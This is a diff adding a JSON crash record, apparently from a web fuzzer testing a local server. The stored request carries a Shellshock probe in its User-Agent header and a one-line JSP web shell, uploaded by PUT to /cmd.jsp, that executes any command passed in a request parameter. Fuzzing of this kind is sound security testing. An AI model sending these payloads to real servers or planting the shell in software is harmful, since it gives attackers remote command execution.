@@ -1,0 +1,22 @@
+{
+  "timestamp": "2025-12-29T14:40:16.244859",
+  "crash_type": "server_crash",
+  "payload": "PUT /cmd.jsp?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Content-Range': 'bytes 0-100/101', 'Content-Length': '59'}\nBody: <%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "payload_hash": "0e4a659cd1720e1c",
+  "request_method": "PUT",
+  "request_path": "/cmd.jsp?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Content-Range": "bytes 0-100/101",
+    "Content-Length": "59"
+  },
+  "request_body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
+  "error_message": "Simulated server_crash",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 508
+}
